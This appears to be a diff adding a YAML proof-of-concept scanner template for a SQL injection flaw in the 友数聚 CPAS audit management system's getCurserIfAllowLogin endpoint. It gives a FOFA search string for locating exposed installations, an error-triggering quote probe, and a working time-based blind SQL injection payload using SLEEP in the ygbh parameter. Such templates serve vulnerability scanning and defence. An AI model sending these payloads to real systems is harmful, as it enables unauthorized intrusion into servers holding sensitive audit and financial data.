@@ -1,0 +1,25 @@
+id: poc-yaml-youdatasum-cpas-getcurserifallowlogin-sqli
+info:
+  name: 友数聚 CPAS审计管理系统 getCurserIfAllowLogin SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: CPAS审计管理系统
+  fofa: body="/cpasm4/static/cap/font/iconfont.css"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /cpasm4/cpasList/getCurserIfAllowLogin
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: ygbh=q'
+  expression: status_code == 500 && contains(body,"服务器内部错误")
+- method: POST
+  path: /cpasm4/cpasList/getCurserIfAllowLogin
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: ygbh=q' AND (SELECT 1635 FROM (SELECT(SLEEP({{.t1}})))mlQT) AND 'qoYJ'='qoYJ
+  expression: status_code == 200 && duration > t1 && duration < t2 && !contains(body,"<")
+transport: http
